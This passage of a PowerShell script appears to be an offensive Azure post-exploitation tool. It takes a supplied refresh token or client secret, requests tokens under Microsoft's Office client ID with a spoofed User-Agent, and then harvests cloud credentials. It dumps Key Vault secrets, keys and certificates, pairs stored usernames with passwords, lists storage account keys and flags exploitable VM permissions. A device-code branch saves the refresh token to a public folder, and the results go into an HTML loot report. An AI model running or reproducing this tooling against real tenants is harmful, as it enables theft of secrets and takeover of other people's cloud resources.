                        try {
                            $Stream = $Response.GetResponseStream()
                            $Reader = New-Object System.IO.StreamReader($Stream)
                            $RawBody = $Reader.ReadToEnd()
                            $JsonBody = $RawBody | ConvertFrom-Json
                            $ErrorMessage = $JsonBody.error.message
                        } catch {
                            $ErrorMessage = "Failed to parse error response."
                        }
                    }

                    if ($StatusCode -eq 429) {
                        $retryAfter = 7
                        if ($Response.Headers["Retry-After"]) {
                            $retryAfter = [int]$Response.Headers["Retry-After"]
                        }
                        Write-Host "[!] 429 Rate Limit - Sleeping $retryAfter seconds..." -ForegroundColor Yellow
                        Start-Sleep -Seconds $retryAfter
                        $RetryCount++
                    }
                    elseif ($StatusCode -eq 400 -and $Action -eq "add" -and $ErrorMessage -match "already exist") {
                        Write-Host "[=] Member already exists in ${GroupId}." -ForegroundColor Yellow
                        $Success = $true
                    }
                    elseif ($StatusCode -eq 400 -and $Action -eq "delete") {
                        Write-Host "[-] Error during DELETE from ${GroupId}: $ErrorMessage (HTTP $StatusCode)" -ForegroundColor Red
                        $Success = $true
                    }
                    else {
                        Write-Host "[-] Unexpected error during $Action for ${GroupId}: $ErrorMessage (HTTP $StatusCode)" -ForegroundColor Red
                        $Success = $true
                    }
                }
            } while (-not $Success -and $RetryCount -lt $MaxRetries)
            Start-Sleep -Milliseconds 300
        }
}


<######################################################################################################################################################>

function Invoke-ResourcePermissions {
    param(
        [string]$RefreshToken,
        [string]$ClientId,
        [string]$ClientSecret,
	    [string]$DomainName,
        [switch]$KeyVault,
        [switch]$StorageAccount,
        [switch]$VirtualMachine,
        [switch]$All
    )

   	    $KeyVaultPermissions = @{
            "Microsoft.KeyVault/*"                          = "Wildcard"
            "Microsoft.KeyVault/vaults/*"                   = "Wildcard2"
            "Microsoft.KeyVault/vaults/read"                = "Vault Read"
            "Microsoft.KeyVault/vaults/write"               = "Vault Write"
            "Microsoft.KeyVault/vaults/secrets/read"        = "Secrets Read"
            "Microsoft.KeyVault/vaults/keys/read"           = "Keys Read"
            "Microsoft.KeyVault/vaults/certificates/read"   = "Certificates Read"
		}

        $VirtualMachinePermissions = @{
            "Microsoft.Compute/virtualMachines/runCommand/action"   = "Run arbitrary commands inside the VM"
            "Microsoft.Compute/virtualMachines/extensions/write"    = "Deploy or modify VM extensions"
            "Microsoft.Compute/virtualMachines/start/action"        = "Start stopped VM"
            "Microsoft.Compute/virtualMachines/restart/action"      = "Restart VM"
            "Microsoft.Compute/virtualMachines/deallocate/action"   = "Stop VM (without deletion)"
            "Microsoft.Compute/virtualMachines/delete"              = "Delete the VM"
            "Microsoft.Compute/virtualMachines/capture/action"      = "Capture VM image (potential cloning)"
            "Microsoft.Compute/virtualMachines/write"               = "Modify VM configuration"
            "Microsoft.Compute/virtualMachines/read"                = "Read VM information and properties"
            "Microsoft.Compute/virtualMachines/*"                   = "another2"
        }

        $StoragePermissions = @{
            "Microsoft.Storage/storageAccounts/listkeys/action"                     = "List storage account access keys"
            "Microsoft.Storage/storageAccounts/regeneratekey/action"                = "Regenerate access keys"
            "Microsoft.Storage/storageAccounts/blobServices/containers/read"        = "List blob containers"
            "Microsoft.Storage/storageAccounts/blobServices/containers/write"       = "Create or update blob containers"
            "Microsoft.Storage/storageAccounts/blobServices/containers/delete"      = "Delete blob containers"
            "Microsoft.Storage/storageAccounts/blobServices/containers/blobs/read"  = "Read blobs (file contents)"
            "Microsoft.Storage/storageAccounts/blobServices/containers/blobs/write" = "Upload or modify blobs"
            "Microsoft.Storage/storageAccounts/fileServices/shares/read"            = "List file shares"
            "Microsoft.Storage/storageAccounts/fileServices/shares/write"           = "Create or modify file shares"
            "Microsoft.Storage/storageAccounts/fileServices/shares/delete"          = "Delete file shares"
            "Microsoft.Storage/storageAccounts/read"                                = "Read storage account configuration"
            "Microsoft.Storage/storageAccounts/write"                               = "Update storage account settings"
            "Microsoft.Storage/storageAccounts/delete"                              = "Delete the entire storage account"
            "Microsoft.Storage/storageAccounts/*"                                   = "another1"
        }


        $ResourceAccessPermissions = @{
            "Microsoft.Authorization/roleAssignments/write"  = "Assign roles to users or identities (privilege escalation)"
            "Microsoft.Authorization/elevateAccess/Action"   = "Elevate access to full subscription scope (for tenant admins)"
            "Microsoft.Authorization/*/Write"                = "Wildcard write permission to authorization-related operations"
            "Microsoft.Resources/subscriptions/write"        = "Modify subscription settings"
            "Microsoft.Resources/deployments/write"          = "Deploy ARM templates (create any resource)"
            "Microsoft.Support/*"                            = "Open support tickets (possible info leak)"
            "Microsoft.Resources/tags/write"                 = "Modify resource tags (bypass tag-based policies)"
            "Microsoft.PolicyInsights/*"                     = "Access or modify policy evaluation results"
        }



    	function Get-DomainName {
            try {
                $response = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration"
                $TenantID = ($response.issuer -split "/")[3]
                Write-Host "[*] Tenant ID for $DomainName is $TenantID" -ForegroundColor DarkCyan
                 return $TenantID
            } catch {
                Write-Error "[-] Failed to retrieve Tenant ID from domain: $DomainName"
                return $null
             }
        }


       	if ($DomainName) {
            $TenantID = Get-DomainName -DomainName $DomainName
            if (-not $TenantID) {
                 Write-Error "[-] Cannot continue without Tenant ID."
                return
            }
        }


		function Get-Token-WithRefreshToken {
		param(
        [Parameter(Mandatory = $false)][string]$RefreshToken,
        [Parameter(Mandatory = $false)][string]$TenantID
		)
		
			$url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
			$body = @{
				"client_id"     = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
				"scope"         = "https://graph.microsoft.com/.default"
				"grant_type"    = "refresh_token"
				"refresh_token" = $RefreshToken
			}
			return (Invoke-RestMethod -Method POST -Uri $url -Body $body).access_token
		}


		function Get-Token-WithClientSecret {
		param(
			[Parameter(Mandatory = $false)][string]$ClientID,
		    [Parameter(Mandatory = $false)][string]$ClientSecret,
            [Parameter(Mandatory = $false)][string]$TenantID

		)
			$url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
			$body = @{
				"client_id"     = $ClientId
				"client_secret" = $ClientSecret
				"scope"         = "https://graph.microsoft.com/.default"
				"grant_type"    = "client_credentials"
			}
			return (Invoke-RestMethod -Method POST -Uri $url -Body $body).access_token
		}

		$authMethod = ""
		if ($RefreshToken) {
			$authMethod = "refresh"
			$GraphAccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken -TenantID $TenantID
		} elseif ($ClientId -and $ClientSecret) {
			$authMethod = "client"
			$GraphAccessToken = Get-Token-WithClientSecret -ClientId $ClientId -ClientSecret $ClientSecret -TenantID $TenantID
		} elseif ($DeviceCodeFlow) {
			$authMethod = "refresh"
			if (Test-Path "C:\Users\Public\RefreshToken.txt"){
				Remove-Item -Path "C:\Users\Public\RefreshToken.txt" -Force}
				$RefreshToken = Get-DeviceCodeToken
				Add-Content -Path "C:\Users\Public\RefreshToken.txt" -Value $RefreshToken
				Write-Host "[FOR YOU BABY] refresh token writen in C:\Users\Public\RefreshToken.txt " -ForegroundColor DarkYellow
				$GraphAccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken -TenantID $TenantID
			}
		if (-not $GraphAccessToken) { return }


   
        function Get-AccessToken {
            if ($RefreshToken) {
                $url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
                $body = @{ client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"; scope = "https://management.azure.com/.default"; grant_type = "refresh_token"; refresh_token = $RefreshToken }
                $Tokens = Invoke-RestMethod -Method POST -Uri $url -Body $body
                Write-Host "[+] Access Token received successfully" -ForegroundColor DarkGray
                Write-Host ""
                return $Tokens.access_token
            } elseif ($ClientId -and $ClientSecret) {
                $url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
                $body = @{ client_id = $ClientId; client_secret = $ClientSecret; scope = "https://management.azure.com/.default"; grant_type = "client_credentials" }
                $Tokens = Invoke-RestMethod -Method POST -Uri $url -Body $body
                Write-Host "[+] Access Token received successfully" -ForegroundColor DarkGray
                Write-Host ""
                return $Tokens.access_token
            } else {
                Write-Error "Must provide either -RefreshToken or -ClientId and -ClientSecret."
                exit
            }
        }

        $ARMAccessToken = Get-AccessToken
        $Headers = @{
            'Authorization' = "Bearer $ARMAccessToken"
            'User-Agent'    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }

        $SubUrl = "https://management.azure.com/subscriptions?api-version=2021-01-01"
        $Subscriptions = @()

		do {
			try {
				$response = Invoke-RestMethod -Uri $SubUrl -Headers $Headers
				$Subscriptions += $response.value

				$SubUrl = $response.nextLink
			} catch {
				Write-Warning "Failed to retrieve subscriptions: $($_.Exception.Message)"
				break
			}
		} while ($SubUrl)

	    $global:Results = @()

        foreach ($sub in $Subscriptions) {
            $subId = $sub.subscriptionId
            $subName = $sub.displayName
            Write-Host "`n[*] Checking subscription: $subName ($subId)" -ForegroundColor Cyan

			$Resources = @()
			$ResourcesUrl = "https://management.azure.com/subscriptions/$subId/resources?api-version=2021-04-01"
			try {
				do {
					$Response = Invoke-RestMethod -Uri $ResourcesUrl -Headers $Headers
					$Resources += $Response.value
					$ResourcesUrl = $Response.nextLink
				} while ($ResourcesUrl)
			}
			catch {
					Write-Warning "Failed to retrieve resources for subscription ${subName}: $($_.Exception.Message)"
					continue
			}

			if ($KeyVault -or $All) {
				$KeyVaults = $Resources | Where-Object { $_.type -eq "Microsoft.KeyVault/vaults" }
					foreach ($kv in $KeyVaults) {
						$kvId = $kv.id
						$kvName = $kv.name
						$kvRg = ($kvId -split '/')[4]
						Write-Host "   [+] Found KeyVault: $kvName in Resource Group: $kvRg" -ForegroundColor Yellow
						try {
							$Permission_Vault_Url = "https://management.azure.com${kvId}/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
							$permResponse = Invoke-RestMethod -Uri $Permission_Vault_Url -Headers $Headers
							$Vault_Actions = $permResponse.value.actions
							$Vault_NotActions = $permResponse.value.notActions
						} catch {
							    Write-Warning "Failed to retrieve permissions for KeyVault $kvName"
							    continue
						    }

							$PermissionFlags = @{
                                MicrosoftKeyVaultWildcard = $false
                                VaultWildcard = $false
                                VaultsRead = $false
                                VaultsWrite = $false
                                SecretsRead = $false
                                KeysRead = $false
                                CertificatesRead = $false
                                BadOption = $false
							}
						
							function Get-AccessToken {
									if ($RefreshToken) {
										$url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
										$body = @{
											client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
											scope = "https://vault.azure.net/.default"
											grant_type = "refresh_token"
											refresh_token = $RefreshToken
										}
										$Tokens = Invoke-RestMethod -Method POST -Uri $url -Body $body
										Write-Host "      [+] Access Token received successfully for Vault API" -ForegroundColor DarkGray
										return $Tokens.access_token
									} elseif ($ClientId -and $ClientSecret) {
										$url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
										$body = @{
											client_id = $ClientId
											client_secret = $ClientSecret
											scope = "https://vault.azure.net/.default"
											grant_type = "client_credentials"
										}
										$Tokens = Invoke-RestMethod -Method POST -Uri $url -Body $body
										Write-Host "      [+] Access Token received successfully for Vault API" -ForegroundColor DarkGray
										return $Tokens.access_token
									} else {
										Write-Error "Must provide either -RefreshToken or -ClientId and -ClientSecret."
										exit
									}
								}

								function Get-VaultItems {
								param (
									[string]$VaultUrl,
									[string]$VaultAccessToken,
									[ValidateSet('secrets', 'keys', 'certificates')]
									[string]$ItemType
								)

								$baseUri = "${VaultUrl}/${ItemType}?api-version=7.3"
								$headers = @{
									'Authorization' = "Bearer $VaultAccessToken"
									'User-Agent'    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
								}

								$AllItems = @()
								$NextUri = $baseUri

								do {
									try {
										$response = Invoke-WebRequest -Uri $NextUri -Headers $headers -UseBasicParsing
										$parsed = $response.Content | ConvertFrom-Json

										$AllItems += $parsed.value

										$NextUri = $parsed.nextLink
									} catch {
										Write-Host "       Failed to fetch $ItemType list from vault"
										break
									}
								} while ($NextUri)

								$DetailedItems = @()

								foreach ($item in $AllItems) {
									$itemUri = if ($ItemType -eq "keys") { $item.kid } else { $item.id }
									try {
										$itemDetailsResponse = Invoke-WebRequest -Uri "$($itemUri)?api-version=7.3" -Headers $headers -UseBasicParsing
										$itemDetails = $itemDetailsResponse.Content | ConvertFrom-Json

										if ($ItemType -eq "secrets") {
											$DetailedItems += [PSCustomObject]@{
												Name  = ($item.id -split '/')[-1]
												Value = $itemDetails.value
											}
										}
										elseif ($ItemType -eq "keys") {
											$DetailedItems += [PSCustomObject]@{
												Name  = ($item.kid -split '/')[-1]
												Value = $itemDetails.key.kid
											}
										}
										elseif ($ItemType -eq "certificates") {
											$DetailedItems += [PSCustomObject]@{
												Name  = ($item.id -split '/')[-1]
												Value = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($itemDetails.cer))
											}
										}
									} catch {
								   
									if ($_.Exception.Response -ne $null) {
										$errorContent = ($_ | ConvertFrom-Json -ErrorAction SilentlyContinue)
										if ($errorContent.error.code -eq "Forbidden" -or $errorContent.error.innererror.code -eq "ForbiddenByRbac") {
											Write-Host "		[-] Access Denied when fetching $ItemType from Vault" -ForegroundColor Red
											return @("Access Denied")
										}
									}

									Write-Host "       Failed to fetch $ItemType list from vault"
									return @()
										}

								}

								return $DetailedItems
							}
					

						foreach ($VaultPerm in $KeyVaultPermissions.Keys) {
							if ($Vault_NotActions -contains "*" -or $Vault_NotActions -contains $VaultPerm) {
								$PermissionFlags.BadOption = $true
							}
							if ($Vault_Actions -contains "Microsoft.KeyVault/*" -or $Vault_Actions -contains "*/read" -or($Vault_Actions -contains "*" -and -not ($Vault_NotActions -contains $VaultPerm))) {
								$PermissionFlags.MicrosoftKeyVaultWildcard = $true
							}
							if ($Vault_Actions -contains "Microsoft.KeyVault/vaults/*" -or ($Vault_Actions -contains "*" -and -not ($Vault_NotActions -contains $VaultPerm))) {
								$PermissionFlags.VaultWildcard = $true
							}
							if ($Vault_Actions -contains "Microsoft.KeyVault/vaults/read" -and -not ($Vault_NotActions -contains $VaultPerm)) {
								$PermissionFlags.VaultsRead = $true
							}
							if ($Vault_Actions -contains "Microsoft.KeyVault/vaults/write" -and -not ($Vault_NotActions -contains $VaultPerm)) {
								$PermissionFlags.VaultsWrite = $true
							}
							if ($Vault_Actions -contains "Microsoft.KeyVault/vaults/secrets/read" -and -not ($Vault_NotActions -contains $VaultPerm)) {
								$PermissionFlags.SecretsRead = $true
							}
							if ($Vault_Actions -contains "Microsoft.KeyVault/vaults/keys/read" -and -not ($Vault_NotActions -contains $VaultPerm)) {
								$PermissionFlags.KeysRead = $true
							}
							if ($Vault_Actions -contains "Microsoft.KeyVault/vaults/certificates/read" -and -not ($Vault_NotActions -contains $VaultPerm)) {
								$PermissionFlags.CertificatesRead = $true
							}
						}

					
						if ($PermissionFlags.BadOption) {
							Write-Host "[!] Bad NotActions detected, skipping Vault enumeration." -ForegroundColor Red
							continue
						}

					   
						if ($PermissionFlags.SecretsRead -or $PermissionFlags.KeysRead -or $PermissionFlags.CertificatesRead -or 
							$PermissionFlags.MicrosoftKeyVaultWildcard -or $PermissionFlags.VaultWildcard) {
							
						
							$VaultAccessToken = Get-AccessToken
							Write-Host "      [+] Access Token received successfully for Vault API" -ForegroundColor DarkGray
							$VaultUrl = "https://$kvName.vault.azure.net"

							if ($PermissionFlags.SecretsRead -or $PermissionFlags.MicrosoftKeyVaultWildcard -or $PermissionFlags.VaultWildcard) {
								$SecretsList = (Get-VaultItems -VaultUrl $VaultUrl -VaultAccessToken $VaultAccessToken -ItemType "secrets")
								foreach ($secret in $SecretsList) {
									$global:Results += [PSCustomObject]@{
										SubscriptionName = $subName
										ResourceGroup    = $kvRg
										ResourceName     = $kvName
										ResourceType     = "KeyVault-Secret"
										SecretBaseName   = $secret.Name
										SecretValue      = $secret.Value
									}
								}
							}

							if ($PermissionFlags.KeysRead -or $PermissionFlags.MicrosoftKeyVaultWildcard -or $PermissionFlags.VaultWildcard) {
								$KeysList = (Get-VaultItems -VaultUrl $VaultUrl -VaultAccessToken $VaultAccessToken -ItemType "keys")
								foreach ($key in $KeysList) {
									$global:Results += [PSCustomObject]@{
										SubscriptionName = $subName
										ResourceGroup    = $kvRg
										ResourceName     = $kvName
										ResourceType     = "KeyVault-Key"
										KeyName          = $key.Name
										KeyValue         = $key.Value
									}
								}
							}

							if ($PermissionFlags.CertificatesRead -or $PermissionFlags.MicrosoftKeyVaultWildcard -or $PermissionFlags.VaultWildcard) {
								$CertificatesList = (Get-VaultItems -VaultUrl $VaultUrl -VaultAccessToken $VaultAccessToken -ItemType "certificates")
								foreach ($cert in $CertificatesList) {
									$global:Results += [PSCustomObject]@{
										SubscriptionName = $subName
										ResourceGroup    = $kvRg
										ResourceName     = $kvName
										ResourceType     = "KeyVault-Certificate"
										CertificateName  = $cert.Name
										CertificateValue = $cert.Value
									}
								}
							}
						} 
					}
				}


				if ($PermissionFlags.BadOption) {
					Write-Host "[!] Bad NotActions detected, skipping Vault enumeration." -ForegroundColor Red
				}

				if ($PermissionFlags.MicrosoftKeyVaultWildcard -or $PermissionFlags.VaultWildcard) {
					Write-Host "     [STAR] Found Star Permission on this Vault Resource" -ForegroundColor DarkGreen
				}

				if ($PermissionFlags.VaultsRead) {
					Write-Host "     [READ] Found Read Permission on this Vault" -ForegroundColor DarkGreen
				}

				if ($PermissionFlags.VaultsWrite) {
					Write-Host "     [WRITE] Found Write Permission on this Vault" -ForegroundColor DarkGreen
				}
				
				if ($PermissionFlags.SecretsRead -or $PermissionFlags.MicrosoftKeyVaultWildcard -or $PermissionFlags.VaultWildcard) {
					
					
						$VaultAccessToken = Get-AccessToken
						$VaultUrl = "https://$kvName.vault.azure.net"
						$SecretsList = (Get-VaultItems -VaultUrl $VaultUrl -VaultAccessToken $VaultAccessToken -ItemType "secrets")

						$SecretPairs = @{}
						$LonelySecrets = @()

						foreach ($secret in $SecretsList) {
							if ($secret.Name -match "^(.+?)-(username|password)$") {
								$base = $Matches[1]
								$type = $Matches[2]

								if (-not $SecretPairs.ContainsKey($base)) {
									$SecretPairs[$base] = @{
										Username = $null
										Password = $null
									}
								}
								$SecretPairs[$base][$type] = $secret.Value
							} else {
								$LonelySecrets += $secret
							}
						}

						
						foreach ($baseName in $SecretPairs.Keys) {
							$pair = $SecretPairs[$baseName]
							$global:Results += [PSCustomObject]@{
								SubscriptionName = $subName
								ResourceGroup    = $kvRg
								ResourceName     = $kvName
								ResourceType     = "KeyVault-Secret-Pair"
								SecretBaseName   = $baseName
								Username         = $pair.Username
								Password         = $pair.Password
							}
						}

						
						foreach ($secret in $LonelySecrets) {
							$global:Results += [PSCustomObject]@{
								SubscriptionName = $subName
								ResourceGroup    = $kvRg
								ResourceName     = $kvName
								ResourceType     = "KeyVault-Secret"
								SecretBaseName   = $secret.Name
								SecretValue      = $secret.Value
							}
						}
								
					
					
				}

				if ($PermissionFlags.KeysRead -or $PermissionFlags.MicrosoftKeyVaultWildcard -or $PermissionFlags.VaultWildcard) {
					$VaultAccessToken = Get-AccessToken
						$VaultUrl = "https://$kvName.vault.azure.net"
						$KeysList = (Get-VaultItems -VaultUrl $VaultUrl -VaultAccessToken $VaultAccessToken -ItemType "keys")

						foreach ($key in $KeysList) {
							$global:Results += [PSCustomObject]@{
								SubscriptionName = $subName
								ResourceGroup    = $kvRg
								ResourceName     = $kvName
								ResourceType     = "KeyVault-Key"
								KeyName          = $key.Name
								KeyValue         = $key.Value
							}
						}
				}

				if ($PermissionFlags.CertificatesRead -or $PermissionFlags.MicrosoftKeyVaultWildcard -or $PermissionFlags.VaultWildcard) {
					$VaultAccessToken = Get-AccessToken
						$VaultUrl = "https://$kvName.vault.azure.net"
						$CertificatesList = (Get-VaultItems -VaultUrl $VaultUrl -VaultAccessToken $VaultAccessToken -ItemType "certificates")

						foreach ($cert in $CertificatesList) {
							$global:Results += [PSCustomObject]@{
								SubscriptionName = $subName
								ResourceGroup    = $kvRg
								ResourceName     = $kvName
								ResourceType     = "KeyVault-Certificate"
								CertificateName  = $cert.Name
								CertificateValue = $cert.Value
							}
						}
				}


				if ($SecretsList.Count -gt 0 -or $KeysList.Count -gt 0 -or $CertificatesList.Count -gt 0) {
						$global:Results += [PSCustomObject]@{
							SubscriptionName = $subName
							ResourceGroup    = $kvRg  
							ResourceName     = $kvName
							ResourceType     = "KeyVault" 
							Secrets          = ($SecretsList -join "<br>") 
							Keys             = ($KeysList -join "<br>")
							Certificates     = ($CertificatesList -join "<br>")
						}
					}

        if ($StorageAccount -or $All) {
				$StorageAccounts = $Resources | Where-Object { $_.type -eq "Microsoft.Storage/storageAccounts" }
				foreach ($sa in $StorageAccounts) {
					$saId = $sa.id
					$saName = $sa.name
					$saRg = ($saId -split '/')[4]

					Write-Host "   [+] Found StorageAccount: $saName in Resource Group: $saRg" -ForegroundColor Yellow

					try {
						$Permission_Storage_Url = "https://management.azure.com${saId}/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
						$permResponse = Invoke-RestMethod -Uri $Permission_Storage_Url -Headers $Headers

						$Storage_Actions = $permResponse.value.actions
						$Storage_NotActions = $permResponse.value.notActions
					} catch {
						#Write-Warning "Failed to retrieve permissions for StorageAccount $saName"
						continue
					}

					$FoundInteresting = $false
					$FoundConflict = $false
					$FoundBad = $false

					foreach ($StoragePerm in $StoragePermissions.Keys) {
						if ($Storage_Actions -contains $StoragePerm -and -not ($Storage_NotActions -contains $StoragePerm)) {
							$FoundInteresting = $true
						} elseif ($Storage_Actions -contains $StoragePerm -and $Storage_NotActions -contains $StoragePerm) {
							$FoundConflict = $true
						} elseif ($Storage_Actions -contains "*" -and -not ($Storage_NotActions -contains $StoragePerm)) {
							$FoundInteresting = $true
						} elseif ($Storage_Actions -contains $StoragePerm -and $Storage_NotActions -contains "*") {
							$FoundBad = $true
						}
					}

					if ($FoundConflict) {
						Write-Host "     [CONFLICT] Some permissions are both allowed and denied!" -ForegroundColor DarkRed
						Write-Host ""
					}
					if ($FoundBad) {
						Write-Host "     [BAD] '*' found in NotActions - global deny!" -ForegroundColor Red
						Write-Host ""
					}
					if ($FoundInteresting) {
						Write-Host "     [GREAT] Found interesting permissions!" -ForegroundColor DarkGreen

						$Storageurl = "https://management.azure.com${saId}/listKeys?api-version=2024-01-01"
						$Headers = @{
							'Content-Type' = "application/json"
							'Authorization' = "Bearer $ARMAccessToken"
							'User-Agent' = "Mozilla/5.0"
						}

						try {
							$StorageResponse = Invoke-RestMethod -Uri $Storageurl -Headers $Headers -Method POST
							if ($StorageResponse.keys) {
								$keys = @($StorageResponse.keys)
								Write-Host "       [+] Key1: $($keys[0].value)" -ForegroundColor Yellow
								Write-Host "       [+] Key2: $($keys[1].value)" -ForegroundColor Yellow

								$global:Results += [PSCustomObject]@{
									SubscriptionName = $subName
									ResourceGroup    = $saRg
									ResourceName     = $saName
									ResourceType     = "StorageAccount"
									Key1             = $keys[0].value
									Key2             = $keys[1].value
								}
							} else {
								Write-Warning "No keys returned from the Storage account!"
							}
						} catch {
							#Write-Host "Failed to get Storage keys:" -ForegroundColor Red
							#Write-Host $_.Exception.Message -ForegroundColor Red
							continue
						}

						Write-Host ""
					}

					if (-not ($FoundInteresting -or $FoundConflict -or $FoundBad)) {
						# Write-Host "    [-] No special permissions found" -ForegroundColor Red
					}
				}
			}


        if ($VirtualMachine -or $All) {
            $VirtualMachines = $Resources | Where-Object { $_.type -eq "Microsoft.Compute/virtualMachines" }
            foreach ($vm in $VirtualMachines) {
                $vmId = $vm.id
                $vmName = $vm.name
				$vmRg   = ($vmId -split '/')[4]
				
                Write-Host "   [+] Found Virtual Machine: $vmName in Resource Group: $vmRg" -ForegroundColor Yellow

                try {
                    $Permission_VM_Url = "https://management.azure.com${vmId}/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
						
							$permResponse = Invoke-RestMethod -Uri $Permission_VM_Url -Headers $Headers
							$VM_Actions = $permResponse.value.actions
							$VM_NotActions = $permResponse.value.notActions
                } catch {
							Write-Warning "Failed to retrieve permissions for VM $vmName"
							continue
                }
				
				$FoundGREAT = $false
				$FoundConflict = $false
				$FoundWOW = $false
				$FoundBAD = $false

                foreach ($VirtualPerm in $VirtualMachinePermissions.Keys) {

                    if ($VM_Actions -contains $VirtualPerm -and -not ($VM_NotActions -contains $VirtualPerm))
					{
						$FoundGREAT = $true
                    } 
					elseif ($VM_Actions -contains $VirtualPerm -and $VM_NotActions -contains $VirtualPerm) 
					{
						$FoundConflict = $true
                    } 
					elseif ($VM_Actions -contains '*' -and -not ($VM_NotActions -contains $VirtualPerm))
					{
						  $FoundWOW = $true
					}
					elseif ($VM_Actions -contains $VirtualPerm -and $VM_NotActions -contains '*') {
						$FoundBAD = $true
                    } else {
 
                    }
				}
                
				if ($FoundGREAT) {
					Write-Host "      [GREAT] Found interesting permissions!" -ForegroundColor DarkGreen
					Write-Host " "
				}
				if ($FoundConflict) {
					Write-Host "     [CONFLICT] Some permissions are both allowed and denied!" -ForegroundColor Yellow
					Write-Host " "
				}
				if ($FoundWOW) {
					Write-Host "     [GREAT] Found interesting permissions!" -ForegroundColor DarkGreen
					Write-Host " "
				}
				if ($FoundBAD) {
					Write-Host "     [BAD] '*' found in NotActions - global deny!" -ForegroundColor Red
					Write-Host " "
				}
				if (-not ($FoundGREAT -or $FoundConflict -or $FoundWOW -or $FoundBAD)) {
					#Write-Host "    [-] No special permissions found" -ForegroundColor Red
					
				}
				
				if ($FoundGREAT -or $FoundWOW) {
				$global:Results += [PSCustomObject]@{
					SubscriptionName = $subName
					ResourceGroup    = $vmRg   
					ResourceName     = $vmName 
					ResourceType     = "VirtualMachine" 
				}

				
            }
        }
		}

	}
if ($global:Results.Count -gt 0) {

# Header
$htmlHeader = @"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Permissions Report</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.datatables.net/1.13.4/css/dataTables.bootstrap5.min.css" rel="stylesheet">
    <style>
        body {
            padding: 20px;
            background-color: #f0f2f5;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        h1 {
            font-weight: bold;
            margin-bottom: 30px;
            text-align: center;
            color: #007bff;
        }
        .nav-tabs .nav-link {
            color: #007bff;
        }
        .nav-tabs .nav-link.active {
            color: white;
            background-color: #007bff;
        }
        .table {
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        table.dataTable td, table.dataTable th {
            white-space: normal; /* במקום nowrap */
            word-break: break-word; /* שובר שורות ארוכות */
            max-width: 400px; /* מגביל את הרוחב */
        }
        table.dataTable th {
            background-color: #007bff;
            color: white;
        }
        .copy-btn, .view-btn {
            margin-top: 3px;
            display: inline-block;
            font-size: 12px;
            padding: 3px 8px;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            color: white;
            transition: background-color 0.3s;
        }
        .copy-btn {
            background-color: #28a745;
        }
        .copy-btn:hover {
            background-color: #218838;
        }
        .view-btn {
            background-color: #6c757d;
            margin-left: 5px;
        }
        .view-btn:hover {
            background-color: #5a6268;
        }
        .modal-content {
            word-break: break-word;
        }
    </style>
</head>

<body>

<h1>Permissions Report</h1>

<div class="container-fluid">
    <ul class="nav nav-tabs mb-3" id="permissionsTab" role="tablist">
        <li class="nav-item">
            <button class="nav-link active" id="kv-tab" data-bs-toggle="tab" data-bs-target="#kv" type="button" role="tab">Key Vaults</button>
        </li>
        <li class="nav-item">
            <button class="nav-link" id="sa-tab" data-bs-toggle="tab" data-bs-target="#sa" type="button" role="tab">Storage Accounts</button>
        </li>
        <li class="nav-item">
            <button class="nav-link" id="vm-tab" data-bs-toggle="tab" data-bs-target="#vm" type="button" role="tab">Virtual Machines</button>
        </li>
    </ul>

    <div class="tab-content" id="permissionsTabContent">
"@


$KeyVaults = $global:Results | Where-Object { $_.ResourceType -match "^KeyVault" }
$StorageAccounts = $global:Results | Where-Object { $_.ResourceType -eq "StorageAccount" }
$VirtualMachines = $global:Results | Where-Object { $_.ResourceType -eq "VirtualMachine" }

$GroupedKeyVaults = $KeyVaults | Group-Object -Property ResourceName


$htmlKV = @"
<div class="tab-pane fade show active" id="kv" role="tabpanel" aria-labelledby="kv-tab">
    <table id="kvTable" class="table table-striped table-bordered nowrap" style="width:100%">
        <thead><tr>
            <th>Subscription Name</th>
            <th>Resource Group</th>
            <th>Resource Name</th>
            <th>Secrets</th>
            <th>Keys</th>
            <th>Certificates</th>
        </tr></thead>
        <tbody>
"@

$htmlKV += ($GroupedKeyVaults | ForEach-Object {
    $kvGroup = $_.Group
    $subName = $kvGroup[0].SubscriptionName
    $rgName = $kvGroup[0].ResourceGroup
    $kvName = $kvGroup[0].ResourceName

    $secrets = @()
    $keys = @()
    $certs = @()

    foreach ($item in $kvGroup) {
        switch ($item.ResourceType) {
            "KeyVault-Secret-Pair" { 
                $secrets += "$($item.SecretBaseName)-username: $($item.Username)<br>$($item.SecretBaseName)-password: $($item.Password)" 
            }
            "KeyVault-Secret" {
                $secrets += "$($item.SecretBaseName): $($item.SecretValue)"
            }
            "KeyVault-Key" {
                $keys += "$($item.KeyName): $($item.KeyValue)"
            }
            "KeyVault-Certificate" {
                $certs += "$($item.CertificateName): $($item.CertificateValue)"
            }
        }
    }

    $secretsCell = if ($secrets.Count -gt 0) { $secrets -join "<br>" } else { "<span class='badge bg-secondary'>No Secrets</span>" }
    $keysCell = if ($keys.Count -gt 0) { $keys -join "<br>" } else { "<span class='badge bg-secondary'>No Keys</span>" }
